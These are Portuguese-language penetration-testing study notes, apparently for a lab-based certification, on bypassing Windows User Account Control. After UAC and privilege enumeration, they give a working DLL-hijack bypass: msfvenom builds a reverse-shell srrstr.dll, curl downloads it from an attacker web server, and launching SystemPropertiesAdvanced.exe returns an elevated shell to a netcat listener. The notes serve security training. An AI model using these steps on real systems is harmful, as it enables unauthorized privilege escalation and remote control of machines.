> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/windows-privilege-escalation/user-account-control.md).

# User Account Control

[O Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite solicitar consentimento para atividades com privilégios elevados.

* **Verificando o usuário atual**

```ps
 whoami /user
```

* **Confirmação de participação no grupo de administradores**

```ps
net localgroup administrators
```

* **Revisão dos privilégios do usuário**

```ps
whoami /priv
```

* **Confirmando se o UAC está ativado**

```ps
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

* **Verificando o nível UAC**

```ps
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

* O valor de `ConsentPromptBehaviorAdmin`é `0x5`, o que significa que o nível mais alto do UAC `Always notify`está ativado. Há menos exceções ao UAC nesse nível mais alto.

* **Verificando a versão do Windows**

```ps
[environment]::OSVersion.Version
```

* O projeto [UACME](https://github.com/hfiref0x/UACME) mantém uma lista de métodos para burlar o UAC, incluindo informações sobre o número da versão do Windows afetada, a técnica utilizada e se a Microsoft lançou uma atualização de segurança para corrigir o problema
* **Revisando a variável de caminho**

```ps
 cmd /c echo %PATH%
```

**Geração da DLL maliciosa srrstr.dll**

* Primeiro, vamos gerar uma DLL para executar um shell reverso.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

* Copie a DLL gerada para uma pasta e configure um mini servidor web em Python para hospedá-la.

```bash
sudo python3 -m http.server 8080
```

* Baixe a DLL maliciosa para o sistema alvo e configure um `Netcat`servidor de escuta em nossa máquina de ataque.

```
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

* **Iniciando o ouvinte nc no host de ataque**

```ps
nc -lvnp 8443
```

* **Testando a conexão**

```ps
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

* Assim que a conexão for restabelecida, veremos os direitos de usuário normais.

**Executando SystemPropertiesAdvanced.exe no host de destino**

* Antes de prosseguirmos, devemos garantir que todas as instâncias do `rundll32`processo da nossa execução anterior tenham sido encerradas.

```ps
 C:\htb> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A

C:\htb> taskkill /PID 7044 /F
SUCCESS: The process with PID 7044 has been terminated.

C:\htb> taskkill /PID 6300 /F
SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F
SUCCESS: The process with PID 5360 has been terminated.
```

* Agora, podemos experimentar a versão de 32 bits a `SystemPropertiesAdvanced.exe`partir do host de destino.

```ps
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

* Ao verificarmos novamente nosso ouvinte, devemos receber uma conexão quase instantaneamente

```bash
nc -lvnp 8443
```
